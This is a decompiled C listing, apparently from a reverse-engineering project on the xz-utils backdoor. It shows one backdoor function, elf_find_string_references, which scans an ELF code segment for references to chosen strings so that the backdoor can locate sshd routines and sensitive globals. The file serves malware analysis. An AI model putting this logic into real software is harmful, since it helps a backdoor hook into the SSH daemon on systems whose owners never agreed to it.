// /home/kali/xzre-ghidra/xzregh/102D30_elf_find_string_references.c
// Function: elf_find_string_references @ 0x102D30
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_find_string_references(elf_info_t * elf_info, string_references_t * refs)


/*
 * AutoDoc: Indexes interesting .rodata strings and the instructions that reference them, recording surrounding function bounds for later
 * lookups. Many downstream heuristics consume this table to locate sshd routines and global pointers tied to sensitive behaviour.
 */

#include "xzre_types.h"

BOOL elf_find_string_references(elf_info_t *elf_info,string_references_t *refs)

{
  void **ppvVar1;
  dasm_ctx_t *pdVar2;
  Elf64_Rela *pEVar3;
  EncodedStringId EVar4;
  BOOL BVar5;
  dasm_ctx_t *code_start;
  char *pcVar6;
  u8 *puVar7;
  void **ppvVar8;
  dasm_ctx_t *pdVar9;
  Elf64_Rela *pEVar10;
  dasm_ctx_t *pdVar11;
  long lVar12;
  string_item_t *psVar13;
  dasm_ctx_t *code_end;
  void **ppvVar14;
  dasm_ctx_t *pdVar15;
  EncodedStringId local_94;
  u64 local_90 [2];
  dasm_ctx_t local_80;
  
  EVar4 = STR_xcalloc_zero_size;
  psVar13 = refs->entries;
  do {
    ((string_item_t *)&psVar13->string_id)->string_id = EVar4;
    EVar4 = EVar4 + 8;
    psVar13 = psVar13 + 1;
  } while (EVar4 != 0xe8);
  pdVar11 = &local_80;
  for (lVar12 = 0x16; lVar12 != 0; lVar12 = lVar12 + -1) {
    *(undefined4 *)&pdVar11->instruction = 0;
    pdVar11 = (dasm_ctx_t *)((long)&pdVar11->instruction + 4);
  }
  local_90[0] = 0;
  local_90[1] = 0;
  code_start = (dasm_ctx_t *)elf_get_code_segment(elf_info,local_90);
  pdVar11 = &local_80;
  if ((code_start != (dasm_ctx_t *)0x0) && (0x10 < local_90[0])) {
    code_end = (dasm_ctx_t *)(code_start->opcode_window + (local_90[0] - 0x25));
    pcVar6 = (char *)0x0;
    while( TRUE ) {
      local_94 = 0;
      pcVar6 = elf_find_string(elf_info,&local_94,pcVar6);
      if (pcVar6 == (char *)0x0) break;
      lVar12 = 0;
      do {
        if (((*(long *)(refs->entries[0].entry_bytes + lVar12 + 0x14) == 0) &&
            (*(EncodedStringId *)(refs->entries[0].entry_bytes + lVar12 + -4) == local_94)) &&
           (puVar7 = find_string_reference((u8 *)code_start,(u8 *)code_end,pcVar6),
           puVar7 != (u8 *)0x0)) {
          *(u8 **)(refs->entries[0].entry_bytes + lVar12 + 0x14) = puVar7;
        }
        lVar12 = lVar12 + 0x20;
      } while (lVar12 != 0x360);
      pcVar6 = pcVar6 + 1;
    }
    ppvVar14 = &refs->entries[0].func_start;
    ppvVar1 = &refs[1].entries[0].func_start;
    ppvVar8 = ppvVar14;
    do {
      pdVar15 = (dasm_ctx_t *)ppvVar8[2];
      if (pdVar15 != (dasm_ctx_t *)0x0) {
        if (code_start <= pdVar15) {
          if ((dasm_ctx_t *)*ppvVar8 < code_start) {
            *ppvVar8 = code_start;
          }
          if (code_start != pdVar15) goto LAB_00102e58;
        }
        if (code_start <= (dasm_ctx_t *)((long)ppvVar8[1] - 1U)) {
          ppvVar8[1] = code_start;
        }
      }
LAB_00102e58:
      ppvVar8 = ppvVar8 + 4;
      pdVar15 = code_start;
    } while (ppvVar8 != ppvVar1);
LAB_00102e64:
    if (pdVar15 < code_end) {
      BVar5 = x86_dasm(pdVar11,(u8 *)pdVar15,(u8 *)code_end);
      pdVar15 = (dasm_ctx_t *)((long)&pdVar15->instruction + 1);
      if (BVar5 != FALSE) {
        pdVar15 = (dasm_ctx_t *)
                  ((u8 *)((long)local_80.instruction + 0x25) + (local_80.instruction_size - 0x25));
        if (*(u32 *)&local_80.opcode_window[3] == 0x168) {
          if (local_80.operand == 0) goto LAB_00102e64;
          pdVar9 = (dasm_ctx_t *)
                   ((u8 *)((long)local_80.instruction + 0x25) +
                   local_80.operand + local_80.instruction_size + -0x25);
LAB_00102ee5:
          if (pdVar9 == (dasm_ctx_t *)0x0) goto LAB_00102e64;
        }
        else {
          pdVar9 = (dasm_ctx_t *)local_80.instruction;
          if (*(u32 *)&local_80.opcode_window[3] == 0xa5fe) goto LAB_00102ee5;
          if (((*(u32 *)&local_80.opcode_window[3] != 0x10d) || (((byte)local_80.prefix.decoded.rex & 0x48) != 0x48))
             || (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) != 0x5000000))
          goto LAB_00102e64;
          pdVar9 = (dasm_ctx_t *)(pdVar15->opcode_window + (local_80.mem_disp - 0x25));
        }
        if ((code_start <= pdVar9) && (ppvVar8 = ppvVar14, pdVar9 <= code_end)) {
          do {
            pdVar2 = (dasm_ctx_t *)ppvVar8[2];
            if (pdVar2 != (dasm_ctx_t *)0x0) {
              if (pdVar9 <= pdVar2) {
                if ((dasm_ctx_t *)*ppvVar8 < pdVar9) {
                  *ppvVar8 = pdVar9;
                }
                if (pdVar2 != pdVar9) goto LAB_00102f31;
              }
              if (pdVar9 <= (dasm_ctx_t *)((long)ppvVar8[1] - 1U)) {
                ppvVar8[1] = pdVar9;
              }
            }
LAB_00102f31:
            ppvVar8 = ppvVar8 + 4;
          } while (ppvVar8 != ppvVar1);
        }
      }
      goto LAB_00102e64;
    }
    while (pEVar10 = elf_find_rela_reloc(elf_info,0,(u64)code_start), ppvVar8 = ppvVar14,
          pEVar10 != (Elf64_Rela *)0x0) {
      do {
        pEVar3 = (Elf64_Rela *)ppvVar8[2];
        if (pEVar3 != (Elf64_Rela *)0x0) {
          if (pEVar10 <= pEVar3) {
            if ((Elf64_Rela *)*ppvVar8 < pEVar10) {
              *ppvVar8 = pEVar10;
            }
            if (pEVar10 != pEVar3) goto LAB_00102f8e;
          }
          if (pEVar10 <= (Elf64_Rela *)((long)ppvVar8[1] - 1U)) {
            ppvVar8[1] = pEVar10;
          }
        }
LAB_00102f8e:
        ppvVar8 = ppvVar8 + 4;
      } while (ppvVar8 != ppvVar1);
    }
    do {
      pdVar11 = (dasm_ctx_t *)ppvVar14[2];
      if (pdVar11 != (dasm_ctx_t *)0x0) {
        if (code_end <= pdVar11) {
          if ((dasm_ctx_t *)*ppvVar14 < code_end) {
            *ppvVar14 = code_end;
          }
          if (pdVar11 != code_end) goto LAB_00102fad;
        }
        pdVar11 = (dasm_ctx_t *)((long)ppvVar14[1] + -1);
        if (code_end <= pdVar11) {
          ppvVar14[1] = code_end;
        }
      }
LAB_00102fad:
      ppvVar14 = ppvVar14 + 4;
    } while (ppvVar14 != ppvVar1);
  }
  return (BOOL)pdVar11;
}

